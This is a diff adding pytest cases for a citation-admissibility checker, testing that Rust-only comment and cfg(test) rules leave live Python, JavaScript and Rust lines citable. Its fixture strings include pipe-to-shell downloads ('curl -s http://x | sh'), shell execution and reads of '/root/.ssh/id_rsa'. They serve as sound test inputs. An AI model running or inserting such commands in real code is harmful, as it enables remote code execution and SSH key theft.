@@ -209,3 +209,89 @@ def test_hash_comments_are_inert_where_the_language_says_so(
     verdict = citation_admissibility(path, source, 1)
     assert not verdict.admissible
     assert verdict.reason == "comment-or-blank"
+
+
+# ``use``/``mod`` declarations and ``#[...]`` attributes are Rust syntax. In
+# another language the same text is code: each line below runs its command.
+@pytest.mark.parametrize(
+    ("path", "source", "line"),
+    [
+        pytest.param(
+            "src/agent.py",
+            "import os\nmod = os; mod.system('curl -s http://x | sh');\n",
+            2,
+            id="python-mod",
+        ),
+        pytest.param(
+            "src/agent.py",
+            "use = __import__('subprocess'); use.run(['sh', '-c', 'x']);\n",
+            1,
+            id="python-use",
+        ),
+        pytest.param(
+            "src/server.js",
+            "mod = require('child_process'); mod.execSync('curl -s x | sh');\n",
+            1,
+            id="javascript-mod",
+        ),
+        pytest.param(
+            "src/server.js",
+            "const t = '#[test]';\n"
+            "function serve() {\n"
+            "  return require('fs').readFileSync('/root/.ssh/id_rsa');\n"
+            "}\n",
+            3,
+            id="javascript-attribute-text",
+        ),
+    ],
+)
+def test_rust_only_rules_do_not_apply_to_other_languages(
+    path: str, source: str, line: int
+) -> None:
+    assert citation_admissibility(path, source, line).admissible
+
+
+# Served Rust that the test-item scan used to swallow: a braceless
+# ``#[cfg(test)]`` item ends at its ``;``, and an attribute or brace inside a
+# literal is not structure.
+@pytest.mark.parametrize(
+    ("source", "served", "test_only"),
+    [
+        pytest.param(
+            "#[cfg(test)]\nmod tests;\n\n"
+            "pub fn serve(q: &str) -> String {\n    TABLE[q].to_string()\n}\n",
+            5,
+            None,
+            id="braceless-mod",
+        ),
+        pytest.param(
+            "#[cfg(test)] use helpers::fixture;\n\npub fn serve() {\n    run();\n}\n",
+            4,
+            None,
+            id="braceless-use",
+        ),
+        pytest.param(
+            "pub fn serve() -> &'static str {\n"
+            '    let s = "#[cfg(test)]";\n'
+            '    std::fs::read_to_string("/root/.ssh/id_rsa").unwrap();\n'
+            "    s\n}\n",
+            3,
+            None,
+            id="attribute-in-string",
+        ),
+        pytest.param(
+            "#[cfg(test)]\nmod tests {\n    const A: char = '{';\n}\n\n"
+            "pub fn serve() -> String { answer_table() }\n",
+            6,
+            3,
+            id="brace-char-literal",
+        ),
+    ],
+)
+def test_served_rust_beside_a_test_item_stays_citable(
+    source: str, served: int, test_only: int | None
+) -> None:
+    assert citation_admissibility("src/lib.rs", source, served).admissible
+    if test_only is not None:
+        verdict = citation_admissibility("src/lib.rs", source, test_only)
+        assert verdict.reason == "cfg-test-only"
